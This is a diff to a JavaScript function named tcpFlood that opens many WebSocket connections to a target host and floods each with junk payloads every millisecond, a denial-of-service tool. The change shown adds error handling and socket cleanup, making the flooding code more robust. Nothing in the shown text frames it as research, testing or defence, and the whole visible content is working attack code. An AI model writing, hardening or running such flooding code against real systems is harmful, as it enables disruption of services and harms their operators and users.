@@ -12,27 +12,33 @@ function tcpFlood(target, threads) {
     const port = url.port || 80;
 
     for (let i = 0; i < threads; i++) {
-      const socket = new WebSocket(`ws://${hostname}:${port}`);
+      try {
+        const socket = new WebSocket(`ws://${hostname}:${port}`);
 
-      socket.onopen = () => {
-        let counter = 0;
-        setInterval(() => {
-          try {
-            const payload = `TCP Flood: Junk data ${counter++}`;
-            socket.send(payload);
-          } catch (e) {
-            socket.close();
-          }
-        }, 1);
-      };
+        socket.onopen = () => {
+          let counter = 0;
+          setInterval(() => {
+            try {
+              const payload = `TCP Flood: Junk data ${counter++}`;
+              socket.send(payload);
+            } catch (e) {
+              console.error("Error sending data:", e);
+              socket.close();
+            }
+          }, 1);
+        };
 
-      socket.onerror = (error) => {
-        console.error("WebSocket error:", error);
-      };
+        socket.onerror = (error) => {
+          console.error("WebSocket error:", error);
+          socket.close();
+        };
 
-      socket.onclose = () => {
-        console.log("WebSocket connection closed.");
-      };
+        socket.onclose = () => {
+          console.log("WebSocket connection closed.");
+        };
+      } catch (socketError) {
+        console.error("Error creating WebSocket:", socketError);
+      }
     }
   } catch (e) {
     console.error("Error:", e);
